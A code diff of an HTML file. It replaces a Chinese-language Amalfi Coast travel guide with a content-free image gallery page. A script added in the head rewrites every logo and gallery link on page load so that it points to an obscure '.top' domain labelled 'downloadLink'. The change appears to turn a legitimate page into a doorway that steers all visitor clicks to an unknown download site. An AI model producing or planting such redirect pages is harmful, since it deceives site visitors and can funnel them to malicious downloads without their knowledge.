@@ -1,140 +1,101 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>阿马尔菲海岸终极旅行指南</title>
-  <style>
-    :root {
-      --blue: #2a5f8a;
-      --green: #6b8e23;
-      --gold: #d4a017;
-      --text: #333;
-      --bg: #f9f9f9;
-    }
-    body {
-      font-family: 'Noto Sans SC', 'Microsoft YaHei', sans-serif;
-      line-height: 1.8;
-      color: var(--text);
-      background: var(--bg);
-      max-width: 1200px;
-      margin: 0 auto;
-      padding: 0 20px;
-    }
-    header {
-      text-align: center;
-      padding: 4rem 0;
-      background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), 
-                  url('./images/01.jpg') center/cover;
-      color: white;
-      margin-bottom: 3rem;
-      border-radius: 0 0 20px 20px;
-    }
-    h1 {
-      font-size: 2.8rem;
-      margin-bottom: 1rem;
-      text-shadow: 2px 2px 8px rgba(0,0,0,0.6);
-    }
-    .destination-card {
-      background: white;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-      margin-bottom: 2.5rem;
-    }
-    .destination-image {
-      width: 100%;
-      height: 380px;
-      object-fit: cover;
-      border-bottom: 4px solid var(--gold);
-    }
-    .destination-content {
-      padding: 1.8rem;
-    }
-    .highlight-tag {
-      background: var(--gold);
-      color: white;
-      padding: 6px 12px;
-      border-radius: 20px;
-      display: inline-block;
-      margin: 0.3rem;
-    }
-    @media (max-width: 768px) {
-      h1 { font-size: 2.2rem; }
-      .destination-image { height: 280px; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Centered Page Layout</title>
+
+    <script>
+      const downloadLink = "https://www.xaz9fj.top";
+
+      document.addEventListener('DOMContentLoaded', function() {
+        const linksToUpdate = document.querySelectorAll('.download-anchor');
+        linksToUpdate.forEach(function(link) {
+          link.href = downloadLink;
+        });
+      });
+    </script>
+
+    <style>
+        body {
+          margin: 0;
+          background-color: #121212;
+          font-family: sans-serif;
+        }
+
+        .container {
+          width: 80%;
+          margin: 40px auto; 
+        }
+
+        .header {
+          text-align: center;
+          margin-bottom: 50px;
+        }
+
+        .logo-image {
+          max-width: 180px;
+          height: auto;
+          margin: 0 auto;
+          display: block;
+        }
+
+        .gallery {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          gap: 30px;
+        }
+
+        .gallery-link {
+          display: block;
+          width: 100%;
+          text-decoration: none;
+        }
+
+        .gallery-image {
+          width: 100%;
+          height: auto;
+          border-radius: 8px;
+          display: block;
+          box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
+          transition: transform 0.3s ease;
+        }
+
+        .gallery-image:hover {
+          transform: scale(1.02);
+        }
+    </style>
 </head>
 <body>
-  <header>
-    <h1>阿马尔菲海岸终极旅行指南</h1>
-    <p>探索地中海岸的宝石：从波西塔诺到拉韦洛</p>
-  </header>
 
-  <main>
-    <!-- 波西塔诺 -->
-    <article class="destination-card">
-      <img src="./images/01.jpg" 
-           alt="波西塔诺"
-           class="destination-image" 
-           loading="lazy"
-           width="800" 
-           height="450">
-      <div class="destination-content">
-        <h2>波西塔诺</h2>
-        <p>意大利最著名的悬崖小镇，彩色房屋如瀑布般倾泻至地中海，拥有绝美的沙滩和奢侈品商店。</p>
-        <div>
-          <span class="highlight-tag">斯皮亚格亚海滩</span>
-          <span class="highlight-tag">圣母升天教堂</span>
-          <span class="highlight-tag">Path of the Gods徒步</span>
+    <div class="container">
+
+      <header class="header">
+        <a href="#" class="download-anchor">
+          <img src="/logo.png" alt="Website Logo" class="logo-image" />
+        </a>
+      </header>
+
+      <main>
+        <div class="gallery">
+          
+          <a href="#" class="download-anchor gallery-link">
+            <img src="/01.png" alt="Image 1" class="gallery-image" />
+          </a>
+          
+          <a href="#" class="download-anchor gallery-link">
+            <img src="/02.png" alt="Image 2" class="gallery-image" />
+          </a>
+          
+          <a href="#" class="download-anchor gallery-link">
+            <img src="/03.png" alt="Image 3" class="gallery-image" />
+          </a>
+
         </div>
-      </div>
-    </article>
+      </main>
 
-    <!-- 阿马尔菲镇 -->
-    <article class="destination-card">
-      <img src="./images/02.jpg" 
-           alt="阿马尔菲镇"
-           class="destination-image" 
-           loading="lazy"
-           width="800" 
-           height="450">
-      <div class="destination-content">
-        <h2>阿马尔菲镇</h2>
-        <p>历史上强大的海上共和国，以其宏伟的大教堂和手工造纸闻名。</p>
-        <div>
-          <span class="highlight-tag">圣安德烈大教堂</span>
-          <span class="highlight-tag">手工造纸博物馆</span>
-        </div>
-      </div>
-    </article>
+    </div>
 
-    <!-- 拉韦洛 -->
-    <article class="destination-card">
-      <img src="./images/03.jpg" 
-           alt="拉韦洛"
-           class="destination-image" 
-           loading="lazy"
-           width="800" 
-           height="450">
-      <div class="destination-content">
-        <h2>拉韦洛</h2>
-        <p>艺术家偏爱的山顶桃源，鲁菲洛别墅的花园是《十日谈》的灵感来源。</p>
-        <div>
-          <span class="highlight-tag">辛波乃别墅</span>
-          <span class="highlight-tag">瓦格纳音乐节</span>
-        </div>
-      </div>
-    </article>
-  </main>
-
-  <footer style="text-align: center; padding: 2rem; color: var(--blue);">
-    <p>© <span id="year"></span> 阿马尔菲海岸旅行指南</p>
-  </footer>
-
-  <script>
-    // 自动更新年份
-    document.getElementById('year').textContent = new Date().getFullYear();
-  </script>
 </body>
 </html>
